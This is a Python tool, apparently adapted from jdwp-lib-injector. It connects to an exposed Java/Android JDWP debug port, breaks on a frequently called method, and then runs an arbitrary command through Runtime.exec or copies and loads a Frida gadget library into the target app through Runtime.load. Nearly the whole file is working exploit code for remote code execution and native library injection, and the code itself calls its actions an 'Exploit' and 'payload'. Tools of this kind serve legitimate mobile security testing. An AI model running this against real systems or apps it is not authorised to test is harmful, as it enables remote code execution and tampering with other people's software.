#!/usr/bin/python3
################################################################################
#
# based on jdwp-lib-injector by @ikoz:
# https://github.com/ikoz/jdwp-lib-injector
#

import logging
import os
import tempfile
import json
import socket
import subprocess
import time
import sys
import struct
import urllib
import argparse
import traceback


################################################################################
#
# JDWP protocol variables
#
HANDSHAKE                 = b"JDWP-Handshake"

REQUEST_PACKET_TYPE       = 0x00
REPLY_PACKET_TYPE         = 0x80

# Command signatures
VERSION_SIG               = (1, 1)
CLASSESBYSIGNATURE_SIG    = (1, 2)
ALLCLASSES_SIG            = (1, 3)
ALLTHREADS_SIG            = (1, 4)
IDSIZES_SIG               = (1, 7)
CREATESTRING_SIG          = (1, 11)
SUSPENDVM_SIG             = (1, 8)
RESUMEVM_SIG              = (1, 9)
SIGNATURE_SIG             = (2, 1)
FIELDS_SIG                = (2, 4)
METHODS_SIG               = (2, 5)
GETVALUES_SIG             = (2, 6)
CLASSOBJECT_SIG           = (2, 11)
INVOKESTATICMETHOD_SIG    = (3, 3)
REFERENCETYPE_SIG         = (9, 1)
INVOKEMETHOD_SIG          = (9, 6)
STRINGVALUE_SIG           = (10, 1)
THREADNAME_SIG            = (11, 1)
THREADSUSPEND_SIG         = (11, 2)
THREADRESUME_SIG          = (11, 3)
THREADSTATUS_SIG          = (11, 4)
EVENTSET_SIG              = (15, 1)
EVENTCLEAR_SIG            = (15, 2)
EVENTCLEARALL_SIG         = (15, 3)

# Other codes
MODKIND_COUNT             = 1
MODKIND_THREADONLY        = 2
MODKIND_CLASSMATCH        = 5
MODKIND_LOCATIONONLY      = 7
EVENT_BREAKPOINT          = 2
SUSPEND_EVENTTHREAD       = 1
SUSPEND_ALL               = 2
NOT_IMPLEMENTED           = 99
VM_DEAD                   = 112
INVOKE_SINGLE_THREADED    = 2
TAG_OBJECT                = 76
TAG_STRING                = 115
TYPE_CLASS                = 1


################################################################################
#
# JDWP client class
#
class JDWPClient:

    def __init__(self, host="127.0.0.1", port=8700):
        self.host = host
        self.port = port
        self.methods = {}
        self.fields = {}
        self.serial = None
        self.id = 0x01
        return

    def create_packet(self, cmdsig, data=b""):
        flags = 0x00
        cmdset, cmd = cmdsig
        pktlen = len(data) + 11
        # Python 3: 'c' format in struct.pack requires bytes of length 1
        pkt = struct.pack(">IIccc", pktlen, self.id,
                          bytes([flags]), bytes([cmdset]), bytes([cmd]))
        pkt += data
        self.id += 2
        return pkt

    def read_reply(self):
        header = self.socket.recv(11)
        if not header:
            raise Exception("Connection closed by remote")
        pktlen, id, flags, errcode = struct.unpack(">IIcH", header)

        if flags == bytes([REPLY_PACKET_TYPE]):
            if errcode:
                raise Exception("Received errcode %d" % errcode)

        buf = b""
        while len(buf) + 11 < pktlen:
            data = self.socket.recv(1024)
            if len(data):
                buf += data
            else:
                logging.info("[!] read_reply: empty recv, connection may be closing")
                time.sleep(1)
        return buf

    def parse_entries(self, buf, formats, explicit=True):
        entries = []
        index = 0

        if explicit:
            nb_entries = struct.unpack(">I", buf[:4])[0]
            buf = buf[4:]
        else:
            nb_entries = 1

        for i in range(nb_entries):
            data = {}
            for fmt, name in formats:
                if fmt == "L" or fmt == 8:
                    data[name] = int(struct.unpack(">Q", buf[index:index+8])[0])
                    index += 8
                elif fmt == "I" or fmt == 4:
                    data[name] = int(struct.unpack(">I", buf[index:index+4])[0])
                    index += 4
                elif fmt == 'S':
                    l = struct.unpack(">I", buf[index:index+4])[0]
                    # Decode bytes to str for string fields
                    data[name] = buf[index+4:index+4+l].decode('utf-8', errors='replace')
                    index += 4 + l
                elif fmt == 'C':
                    # Python 3: indexing bytes returns int directly
                    data[name] = buf[index]
                    index += 1
                elif fmt == 'Z':
                    # Python 3: indexing bytes returns int directly
                    t = buf[index]
                    if t == 115:  # ord('s') == 115
                        s = self.solve_string(buf[index+1:index+9])
                        data[name] = s
                        index += 9
                    elif t == 73:  # ord('I') == 73
                        data[name] = struct.unpack(">I", buf[index+1:index+5])[0]
                        buf = struct.unpack(">I", buf[index+5:index+9])
                        index = 0
                else:
                    logging.info("Error")
                    sys.exit(1)

            entries.append(data)

        return entries

    def format(self, fmt, value):
        if fmt == "L" or fmt == 8:
            return struct.pack(">Q", value)
        elif fmt == "I" or fmt == 4:
            return struct.pack(">I", value)

        raise Exception("Unknown format")

    def unformat(self, fmt, value):
        if fmt == "L" or fmt == 8:
            return struct.unpack(">Q", value[:8])[0]
        elif fmt == "I" or fmt == 4:
            return struct.unpack(">I", value[:4])[0]
        else:
            raise Exception("Unknown format")
        return

    def start(self):
        logging.info("[*] Starting JDWP handshake...")
        self.handshake(self.host, self.port)
        logging.info("[*] Handshake successful, retrieving VM information...")
        self.idsizes()
        self.getversion()
        self.allclasses()
        return

    def handshake(self, host, port):
        s = socket.socket()
        s.settimeout(10) 
        try:
            s.connect((host, port))
        except socket.error as msg:
            raise Exception("Failed to connect: %s" % msg)

        s.send(HANDSHAKE)

        if s.recv(len(HANDSHAKE)) != HANDSHAKE:
            raise Exception("Failed to handshake")
        else:
            s.settimeout(30) 
            self.socket = s

        return

    def leave(self):
        if hasattr(self, 'socket'):
            self.socket.close()
        return

    def getversion(self):
        self.socket.sendall(self.create_packet(VERSION_SIG))
        buf = self.read_reply()
        formats = [('S', "description"), ('I', "jdwpMajor"), ('I', "jdwpMinor"),
                   ('S', "vmVersion"), ('S', "vmName")]
        for entry in self.parse_entries(buf, formats, False):
            for name, value in entry.items():  # .iteritems() → .items()
                setattr(self, name, value)
        return

    @property
    def version(self):
        return "%s - %s" % (self.vmName, self.vmVersion)

    def idsizes(self):
        self.socket.sendall(self.create_packet(IDSIZES_SIG))
        buf = self.read_reply()
        formats = [("I", "fieldIDSize"), ("I", "methodIDSize"), ("I", "objectIDSize"),
                   ("I", "referenceTypeIDSize"), ("I", "frameIDSize")]
        for entry in self.parse_entries(buf, formats, False):
            for name, value in entry.items():  # .iteritems() → .items()
                setattr(self, name, value)
        return

    def allthreads(self):
        try:
            getattr(self, "threads")
        except:
            self.socket.sendall(self.create_packet(ALLTHREADS_SIG))
            buf = self.read_reply()
            formats = [(self.objectIDSize, "threadId")]
            self.threads = self.parse_entries(buf, formats)
        finally:
            return self.threads

    def get_thread_by_name(self, name):
        self.allthreads()
        for t in self.threads:
            threadId = self.format(self.objectIDSize, t["threadId"])
            self.socket.sendall(self.create_packet(THREADNAME_SIG, data=threadId))
            buf = self.read_reply()
            if len(buf) and name == self.readstring(buf):
                return t
        return None

    def allclasses(self):
        try:
            getattr(self, "classes")
        except:
            self.socket.sendall(self.create_packet(ALLCLASSES_SIG))
            buf = self.read_reply()
            formats = [('C', "refTypeTag"),
                       (self.referenceTypeIDSize, "refTypeId"),
                       ('S', "signature"),
                       ('I', "status")]
            self.classes = self.parse_entries(buf, formats)

        return self.classes

    def get_class_by_name(self, name):
        for entry in self.classes:
            if entry["signature"].lower() == name.lower():
                return entry
        return None

    def get_methods(self, refTypeId):
        if refTypeId not in self.methods:  # .has_key() → `in`
            refId = self.format(self.referenceTypeIDSize, refTypeId)
            self.socket.sendall(self.create_packet(METHODS_SIG, data=refId))
            buf = self.read_reply()
            formats = [(self.methodIDSize, "methodId"),
                       ('S', "name"),
                       ('S', "signature"),
                       ('I', "modBits")]
            self.methods[refTypeId] = self.parse_entries(buf, formats)
        return self.methods[refTypeId]

    def get_method_by_name(self, name):
        for refId in self.methods.keys():
            for entry in self.methods[refId]:
                if entry["name"].lower() == name.lower():
                    return entry
        return None

    def getfields(self, refTypeId):
        if refTypeId not in self.fields:  # .has_key() → `in`
            refId = self.format(self.referenceTypeIDSize, refTypeId)
            self.socket.sendall(self.create_packet(FIELDS_SIG, data=refId))
            buf = self.read_reply()
            formats = [(self.fieldIDSize, "fieldId"),
                       ('S', "name"),
                       ('S', "signature"),
                       ('I', "modbits")]
            self.fields[refTypeId] = self.parse_entries(buf, formats)
        return self.fields[refTypeId]

    def getvalue(self, refTypeId, fieldId):
        data = self.format(self.referenceTypeIDSize, refTypeId)
        data += struct.pack(">I", 1)
        data += self.format(self.fieldIDSize, fieldId)
        self.socket.sendall(self.create_packet(GETVALUES_SIG, data=data))
        buf = self.read_reply()
        formats = [("Z", "value")]
        field = self.parse_entries(buf, formats)[0]
        return field

    def createstring(self, data):
        buf = self.buildstring(data)
        self.socket.sendall(self.create_packet(CREATESTRING_SIG, data=buf))
        buf = self.read_reply()
        return self.parse_entries(buf, [(self.objectIDSize, "objId")], False)

    def buildstring(self, data):
        # Accept str or bytes
        if isinstance(data, str):
            data = data.encode('utf-8')
        return struct.pack(">I", len(data)) + data

    def readstring(self, data):
        size = struct.unpack(">I", data[:4])[0]
        # Decode bytes to str
        return data[4:4+size].decode('utf-8', errors='replace')

    def suspendvm(self):
        self.socket.sendall(self.create_packet(SUSPENDVM_SIG))
        self.read_reply()
        return

    def resumevm(self):
        self.socket.sendall(self.create_packet(RESUMEVM_SIG))
        self.read_reply()
        return

    def invokestatic(self, classId, threadId, methId, *args):
        data = self.format(self.referenceTypeIDSize, classId)
        data += self.format(self.objectIDSize, threadId)
        data += self.format(self.methodIDSize, methId)
        data += struct.pack(">I", len(args))
        for arg in args:
            data += arg
        data += struct.pack(">I", 0)

        self.socket.sendall(self.create_packet(INVOKESTATICMETHOD_SIG, data=data))
        buf = self.read_reply()
        return buf

    def invoke(self, objId, threadId, classId, methId, *args):
        data = self.format(self.objectIDSize, objId)
        data += self.format(self.objectIDSize, threadId)
        data += self.format(self.referenceTypeIDSize, classId)
        data += self.format(self.methodIDSize, methId)
        data += struct.pack(">I", len(args))
        for arg in args:
            data += arg
        data += struct.pack(">I", 0)

        self.socket.sendall(self.create_packet(INVOKEMETHOD_SIG, data=data))
        buf = self.read_reply()
        return buf

    def invokeVoid(self, objId, threadId, classId, methId, *args):
        data = self.format(self.objectIDSize, objId)
        data += self.format(self.objectIDSize, threadId)
        data += self.format(self.referenceTypeIDSize, classId)
        data += self.format(self.methodIDSize, methId)
        data += struct.pack(">I", len(args))
        for arg in args:
            data += arg
        data += struct.pack(">I", 0)

        self.socket.sendall(self.create_packet(INVOKEMETHOD_SIG, data=data))

        # Must read reply to avoid desyncing the JDWP protocol
        buf = self.read_reply()
        return buf

    def solve_string(self, objId):
        self.socket.sendall(self.create_packet(STRINGVALUE_SIG, data=objId))
        buf = self.read_reply()
        if len(buf):
            return self.readstring(buf)
        else:
            return ""

    def query_thread(self, threadId, kind):
        data = self.format(self.objectIDSize, threadId)
        self.socket.sendall(self.create_packet(kind, data=data))
        buf = self.read_reply()
        return

    def suspend_thread(self, threadId):
        return self.query_thread(threadId, THREADSUSPEND_SIG)

    def status_thread(self, threadId):
        return self.query_thread(threadId, THREADSTATUS_SIG)

    def resume_thread(self, threadId):
        return self.query_thread(threadId, THREADRESUME_SIG)

    def send_event(self, eventCode, *args):
        data = b""
        data += bytes([eventCode])        # chr() → bytes([])
        data += bytes([SUSPEND_ALL])      # chr() → bytes([])
        data += struct.pack(">I", len(args))

        for kind, option in args:
            data += bytes([kind])         # chr() → bytes([])
            data += option

        self.socket.sendall(self.create_packet(EVENTSET_SIG, data=data))
        buf = self.read_reply()
        return struct.unpack(">I", buf)[0]

    def clear_event(self, eventCode, rId):
        data = bytes([eventCode])         # chr() → bytes([])
        data += struct.pack(">I", rId)
        self.socket.sendall(self.create_packet(EVENTCLEAR_SIG, data=data))
        self.read_reply()
        return

    def clear_events(self):
        self.socket.sendall(self.create_packet(EVENTCLEARALL_SIG))
        self.read_reply()
        return

    def wait_for_event(self):
        buf = self.read_reply()
        return buf

    def parse_event_breakpoint(self, buf, eventId):
        num = struct.unpack(">I", buf[2:6])[0]
        rId = struct.unpack(">I", buf[6:10])[0]
        if rId != eventId:
            return None
        tId = self.unformat(self.objectIDSize, buf[10:10+self.objectIDSize])
        loc = -1  # don't care
        return rId, tId, loc


def runtime_exec(jdwp, args):
    logging.info("[+] Targeting '%s:%d'" % (args.target, args.port))
    logging.info("[+] Reading settings for '%s'" % jdwp.version)

    # 1. get Runtime class reference
    runtimeClass = jdwp.get_class_by_name("Ljava/lang/Runtime;")
    if runtimeClass is None:
        logging.info("[-] Cannot find class Runtime")
        return False
    logging.info("[+] Found Runtime class: id=%x" % runtimeClass["refTypeId"])

    # 2. get getRuntime() meth reference
    jdwp.get_methods(runtimeClass["refTypeId"])
    getRuntimeMeth = jdwp.get_method_by_name("getRuntime")
    if getRuntimeMeth is None:
        logging.info("[-] Cannot find method Runtime.getRuntime()")
        return False
    logging.info("[+] Found Runtime.getRuntime(): id=%x" % getRuntimeMeth["methodId"])

    # 3. setup breakpoint on frequently called method
    c = jdwp.get_class_by_name(args.break_on_class)
    if c is None:
        logging.info("[-] Could not access class '%s'" % args.break_on_class)
        logging.info("[-] It is possible that this class is not used by application")
        logging.info("[-] Test with another one with option `--break-on`")
        return False

    jdwp.get_methods(c["refTypeId"])
    m = jdwp.get_method_by_name(args.break_on_method)
    if m is None:
        logging.info("[-] Could not access method '%s'" % args.break_on)
        return False

    # bytes([]) instead of chr()
    loc = bytes([TYPE_CLASS])
    loc += jdwp.format(jdwp.referenceTypeIDSize, c["refTypeId"])
    loc += jdwp.format(jdwp.methodIDSize, m["methodId"])
    loc += struct.pack(">II", 0, 0)
    data = [(MODKIND_LOCATIONONLY, loc)]
    rId = jdwp.send_event(EVENT_BREAKPOINT, *data)
    logging.info("[+] Created break event id=%x" % rId)

    # 4. resume vm and wait for event
    jdwp.resumevm()

    logging.info("[+] Waiting for an event on '%s'" % args.break_on)
    attempt = 0
    while True:
        attempt += 1
        logging.info(f"[.] wait_for_event attempt #{attempt}...")
        buf = jdwp.wait_for_event()
        logging.info(f"[.] got event buf len={len(buf)}, checking breakpoint match...")
        ret = jdwp.parse_event_breakpoint(buf, rId)
        if ret is not None:
            break
        logging.info(f"[.] event did not match rId={rId}, waiting again...")

    rId, tId, loc = ret
    logging.info("[+] Received matching event from thread %#x" % tId)

    time.sleep(1)
    jdwp.clear_event(EVENT_BREAKPOINT, rId)

    # 5. Now we can execute any code
    if args.cmd:
        runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], args.cmd)
    else:
        if hasattr(args, 'package_name') and args.package_name:
            packagename = args.package_name
            logging.info(f"Using package name from Frida: {packagename}")
        else:
            packagename = getPackageName(jdwp, tId)
            if not packagename or packagename is False:
                logging.info("[-] Failed to get package name")
                return False
        tmpLocation = "/data/local/tmp/frida-gadget.so"
        tmpConfigLocation = "/data/local/tmp/frida-gadget.config"
        dstLocation = "/data/data/" + packagename + "/frida-gadget.so"
        dstConfigLocation = "/data/data/" + packagename + "/frida-gadget.config"
        command = "cp " + tmpLocation + " " + dstLocation
        command_config = "cp " + tmpConfigLocation + " " + dstConfigLocation
        
        logging.info("[*] Pushing Frida Gadget and config to device...")
        _push_gadget_config(args.serial)
        
        logging.info("[*] Copying library to " + dstLocation)
        runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], command)
        time.sleep(2)
        
        logging.info("[*] Copying config to " + dstConfigLocation)
        runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], command_config)
        time.sleep(2)
        logging.info("[*] Executing Runtime.load(" + dstLocation + ")")
        jdwp.socket.settimeout(120)
        runtime_load_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], dstLocation)
        jdwp.socket.settimeout(60)
        time.sleep(2)
        logging.info("[*] Library should now be loaded")

    jdwp.resumevm()

    logging.info("[!] Command successfully executed")

    return True


def runtime_exec_info(jdwp, threadId):
    #
    # This function calls java.lang.System.getProperties() and
    # displays OS properties (non-intrusive)
    #
    properties = {
        "java.version": "Java Runtime Environment version",
        "java.vendor": "Java Runtime Environment vendor",
        "java.vendor.url": "Java vendor URL",
        "java.home": "Java installation directory",
        "java.vm.specification.version": "Java Virtual Machine specification version",
        "java.vm.specification.vendor": "Java Virtual Machine specification vendor",
        "java.vm.specification.name": "Java Virtual Machine specification name",
        "java.vm.version": "Java Virtual Machine implementation version",
        "java.vm.vendor": "Java Virtual Machine implementation vendor",
        "java.vm.name": "Java Virtual Machine implementation name",
        "java.specification.version": "Java Runtime Environment specification version",
        "java.specification.vendor": "Java Runtime Environment specification vendor",
        "java.specification.name": "Java Runtime Environment specification name",
        "java.class.version": "Java class format version number",
        "java.class.path": "Java class path",
        "java.library.path": "List of paths to search when loading libraries",
        "java.io.tmpdir": "Default temp file path",
        "java.compiler": "Name of JIT compiler to use",
        "java.ext.dirs": "Path of extension directory or directories",
        "os.name": "Operating system name",
        "os.arch": "Operating system architecture",
        "os.version": "Operating system version",
        "file.separator": "File separator",
        "path.separator": "Path separator",
        "user.name": "User's account name",
        "user.home": "User's home directory",
        "user.dir": "User's current working directory",
    }

    systemClass = jdwp.get_class_by_name("Ljava/lang/System;")
    if systemClass is None:
        logging.info("[-] Cannot find class java.lang.System")
        return False

    jdwp.get_methods(systemClass["refTypeId"])
    getPropertyMeth = jdwp.get_method_by_name("getProperty")
    if getPropertyMeth is None:
        logging.info("[-] Cannot find method System.getProperty()")
        return False

    for propStr, propDesc in properties.items():  # .iteritems() → .items()
        propObjIds = jdwp.createstring(propStr)
        if len(propObjIds) == 0:
            logging.info("[-] Failed to allocate command")
            return False
        propObjId = propObjIds[0]["objId"]

        # bytes([TAG_OBJECT]) instead of chr(TAG_OBJECT)
        data = [bytes([TAG_OBJECT]) + jdwp.format(jdwp.objectIDSize, propObjId)]
        buf = jdwp.invokestatic(systemClass["refTypeId"],
                                threadId,
                                getPropertyMeth["methodId"],
                                *data)
        # Python 3: buf[0] is int, compare directly with TAG_STRING
        if buf[0] != TAG_STRING:
            logging.info("[-] %s: Unexpected returned type: expecting String" % propStr)
        else:
            retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
            res = jdwp.solve_string(jdwp.format(jdwp.objectIDSize, retId))
            logging.info("[+] Found %s '%s'" % (propDesc, res))

    return True


def runtime_exec_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, command):
    #
    # This function will invoke command as a payload, which will be running
    # with JVM privilege on host (intrusive).
    #
    logging.info("[+] Selected payload '%s'" % command)

    # 1. allocating string containing our command to exec()
    cmdObjIds = jdwp.createstring(command)
    if len(cmdObjIds) == 0:
        logging.info("[-] Failed to allocate command")
        return False
    cmdObjId = cmdObjIds[0]["objId"]
    logging.info("[+] Command string object created id:%x" % cmdObjId)

    # 2. use context to get Runtime object
    buf = jdwp.invokestatic(runtimeClassId, threadId, getRuntimeMethId)
    # Python 3: buf[0] is int
    if buf[0] != TAG_OBJECT:
        logging.info("[-] Unexpected returned type: expecting Object")
        return False
    rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])

    if rt is None:
        logging.info("[-] Failed to invoke Runtime.getRuntime()")
        return False
    logging.info("[+] Runtime.getRuntime() returned context id:%#x" % rt)

    # 3. find exec() method
    execMeth = jdwp.get_method_by_name("exec")
    if execMeth is None:
        logging.info("[-] Cannot find method Runtime.exec()")
        return False
    logging.info("[+] found Runtime.exec(): id=%x" % execMeth["methodId"])

    # 4. call exec() in this context with the alloc-ed string
    data = [bytes([TAG_OBJECT]) + jdwp.format(jdwp.objectIDSize, cmdObjId)]
    buf = jdwp.invoke(rt, threadId, runtimeClassId, execMeth["methodId"], *data)
    if buf[0] != TAG_OBJECT:
        logging.info("[-] Unexpected returned type: expecting Object")
        return False

    retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
    logging.info("[+] Runtime.exec() successful, retId=%x" % retId)

    return True


def getPackageName(jdwp, threadId):
    #
    # This function will invoke ActivityThread.currentApplication().getPackageName()
    #
    activityThreadClass = jdwp.get_class_by_name("Landroid/app/ActivityThread;")
    if activityThreadClass is None:
        logging.info("[-] Cannot find class android.app.ActivityThread")
        return False

    contextWrapperClass = jdwp.get_class_by_name("Landroid/content/ContextWrapper;")
    if contextWrapperClass is None:
        logging.info("[-] Cannot find class android.content.ContextWrapper")
        return False

    jdwp.get_methods(activityThreadClass["refTypeId"])
    jdwp.get_methods(contextWrapperClass["refTypeId"])

    getContextMeth = jdwp.get_method_by_name("currentApplication")
    if getContextMeth is None:
        logging.info("[-] Cannot find method ActivityThread.currentApplication()")
        return False

    buf = jdwp.invokestatic(
        activityThreadClass["refTypeId"], threadId, getContextMeth["methodId"])
    if buf[0] != TAG_OBJECT:
        logging.info("[-] Unexpected returned type: expecting Object")
        return False
    rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
    if rt is None:
        logging.info("[-] Failed to invoke ActivityThread.currentApplication()")
        return False

    # 3. find getPackageName() method
    getPackageNameMeth = jdwp.get_method_by_name("getPackageName")
    if getPackageNameMeth is None:
        logging.info("[-] Cannot find method ActivityThread.currentApplication().getPackageName()")
        return False

    # 4. call getPackageNameMeth()
    buf = jdwp.invoke(rt, threadId, contextWrapperClass["refTypeId"], getPackageNameMeth["methodId"])
    if buf[0] != TAG_STRING:
        logging.info("[-] Unexpected returned type: expecting String")
    else:
        retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
        res = jdwp.solve_string(jdwp.format(jdwp.objectIDSize, retId))
        logging.info("[+] getPackageMethod(): '%s'" % res)

    return "%s" % res


def runtime_load_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, library):
    #
    # This function will run Runtime.load() with library as a payload
    #

    # 1. allocating string containing our library path
    cmdObjIds = jdwp.createstring(library)
    if len(cmdObjIds) == 0:
        logging.info("[-] Failed to allocate library string")
        return False
    cmdObjId = cmdObjIds[0]["objId"]

    # 2. use context to get Runtime object
    buf = jdwp.invokestatic(runtimeClassId, threadId, getRuntimeMethId)
    if buf[0] != TAG_OBJECT:
        logging.info("[-] Unexpected returned type: expecting Object")
        return False
    rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])

    if rt is None:
        logging.info("[-] Failed to invoke Runtime.getRuntime()")
        return False

    # 3. find load() method
    loadMeth = jdwp.get_method_by_name("load")
    if loadMeth is None:
        logging.info("[-] Cannot find method Runtime.load()")
        return False

    # 4. call load() in this context with the alloc-ed string
    data = [bytes([TAG_OBJECT]) + jdwp.format(jdwp.objectIDSize, cmdObjId)]
    jdwp.invokeVoid(rt, threadId, runtimeClassId, loadMeth["methodId"], *data)

    logging.info("[+] Runtime.load(%s) probably successful" % library)

    return True
def _push_gadget_config(serial):
    logging.info("[*] Generating frida-gadget.config...")
    
    config_data = {
        "interaction": {
            "type": "listen",
            "address": "127.0.0.1",
            "port": 27042,
            "on_port_conflict": "replace",
            "on_load": "resume"
        }
    }
    
    # Creates a temporary file locally
    with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.config') as tmp_config:
        json.dump(config_data, tmp_config)
        tmp_config_path = tmp_config.name

    try:
        adb_cmd = ["adb"]
        if serial:
            adb_cmd.extend(["-s", serial])
            
        target_tmp_path = "/data/local/tmp/frida-gadget.config"
        
        # Pushes the config to the temporary Android folder
        push_cmd = adb_cmd.copy() + ["push", tmp_config_path, target_tmp_path]
        subprocess.run(push_cmd, check=True, capture_output=True)
        
        logging.info("[+] frida-gadget.config pushed to /data/local/tmp/")
    except Exception as e:
        logging.error(f"[-] Failed to push the configuration file: {e}")
    finally:
        # Cleans up the local file
        os.remove(tmp_config_path)
def _is_gadget_running(serial=None):
    adb_cmd = ["adb"]
    if serial:
        adb_cmd.extend(["-s", serial])
    adb_cmd.extend(["shell", "ss 2>/dev/null | grep '127.0.0.1:27042'"])
    
    result = subprocess.run(
        adb_cmd,
        capture_output=True, text=True
    )
    return "127.0.0.1:27042" in result.stdout
def run_jdwp(target, port, cmd=None, break_on="android.os.Handler.dispatchMessage", package_name=None, serial=None):
    classname, meth = str2fqclass(break_on)

    class Args:
        pass
    if _is_gadget_running(serial=serial):
                logging.info("[*] Detected Frida gadget running on device, will attempt to use it for library injection")
                return {"status": "gadget_detected"}

    args = Args()
    args.target = target
    args.serial = serial
    args.port = port
    args.cmd = cmd
    args.loadlib = os.path.expanduser("~/.cache/barbatos/frida-gadget.so")
    args.break_on = break_on
    args.break_on_class = classname
    args.break_on_method = meth
    args.package_name = package_name
    # args to string
    logging.info(f"[*] Running JDWP client with args: {args.__dict__}")

    cli = JDWPClient(target, port)
    try:
        logging.info("run_jdwp: connecting + handshake...")
        cli.handshake(target, port)
        logging.info("run_jdwp: handshake OK")

        cli.idsizes()
        logging.info("run_jdwp: idsizes OK")

        cli.getversion()
        logging.info("run_jdwp: getversion OK — %s" % cli.version)

        cli.allclasses()
        logging.info("run_jdwp: allclasses OK — %d classes loaded" % len(cli.classes))

        logging.info("run_jdwp: calling runtime_exec...")
        success = runtime_exec(cli, args)
        return {"status": "completed" if success else "failed"}
    
    except socket.timeout:
        return {"status": "timeout", "error_message": "Timeout waiting for breakpoint — app may not be calling the method"}
    except Exception as e:
        traceback.print_exc()
        return {"status": "unknown_error", "error_message": str(e)}
    finally:
        cli.leave()

def str2fqclass(s):
    i = s.rfind('.')
    if i == -1:
        logging.info("[-] Cannot parse path")
        sys.exit(1)

    method = s[i:][1:]
    classname = 'L' + s[:i].replace('.', '/') + ';'
    return classname, method


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)

    parser.add_argument("-t", "--target", type=str, metavar="IP",
                        help="Remote target IP", default="127.0.0.1")
    parser.add_argument("-p", "--port", type=int, metavar="PORT",
                        default=8700, help="Remote target port")
    parser.add_argument("--break-on", dest="break_on", type=str, metavar="JAVA_METHOD",
                        default="android.os.Handler.dispatchMessage",
                        help="Specify full path to method to break on")
    parser.add_argument("--cmd", dest="cmd", type=str, metavar="COMMAND",
                        help="Specify command to execute remotely")
    parser.add_argument("--loadlib", dest="loadlib", type=str, metavar="LIBRARYNAME",
                        help="Specify library to inject into process load", default=os.path.expanduser("~/.cache/barbatos/frida-gadget.so"))

    args = parser.parse_args()
    logging.info(f"[*] Using args: {args}")
    classname, meth = str2fqclass(args.break_on)
    setattr(args, "break_on_class", classname)
    setattr(args, "break_on_method", meth)

    retcode = 0

    try:
        cli = JDWPClient(args.target, args.port)
        logging.info("[*] Starting JDWP client...")
        cli.start()

        if runtime_exec(cli, args) == False:
            logging.info("[-] Exploit failed")
            retcode = 1

    except KeyboardInterrupt:
        logging.info("[+] Exiting on user's request")

    except Exception as e:
        logging.info("[-] Exception: %s" % e)
        traceback.print_exc()
        retcode = 1
        cli = None

    finally:
        if cli:
            cli.leave()

    sys.exit(retcode)
